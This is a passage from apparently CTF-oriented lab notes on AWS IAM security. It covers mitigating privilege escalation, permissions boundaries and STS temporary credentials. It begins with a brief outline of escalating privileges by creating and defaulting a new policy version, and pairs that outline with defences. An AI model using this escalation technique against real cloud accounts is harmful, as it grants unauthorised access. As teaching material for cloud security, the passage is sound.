1. Create new policy version with elevated permissions
2. Set it as default
3. Your effective permissions now include the new version's grants
   (subject to any permissions boundary)
```

**Mitigation**: never grant `iam:CreatePolicyVersion` or `iam:SetDefaultPolicyVersion` to identities in a way that allows self-referential escalation. Use **permissions boundaries** or **SCPs** as additional guardrails.

---

### IAM Permissions Boundaries

A permissions boundary is an IAM managed policy attached to a user or role that defines the **maximum permissions** that identity can ever have — regardless of what identity policies grant.

```
Without boundary:
  effective = identity_policies

With boundary:
  effective = identity_policies ∩ boundary
```

Example: if your identity policy grants `"Action":"*"` but your boundary only allows `secretsmanager:GetSecretValue` on one specific secret, that is the only action that succeeds.

Boundaries cannot be modified or removed by the identity they are applied to (unless the identity has `iam:PutUserPermissionsBoundary` or `iam:DeleteUserPermissionsBoundary` — which should never be self-granted).

This makes permissions boundaries an effective **blast radius limiter** for compromised credentials and a defence against the `iam:CreatePolicyVersion` escalation technique.

---

### Temporary Security Credentials (STS)

When you assume an IAM role, AWS STS returns three values:

```
AccessKeyId     — temporary access key (starts with ASIA)
SecretAccessKey — temporary secret
SessionToken    — required alongside the temporary key
```

These credentials expire (typically 1 hour). All three must be provided together. Export them as:

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
```

---

*Labs designed as part of the stags-lab CTF platform.*
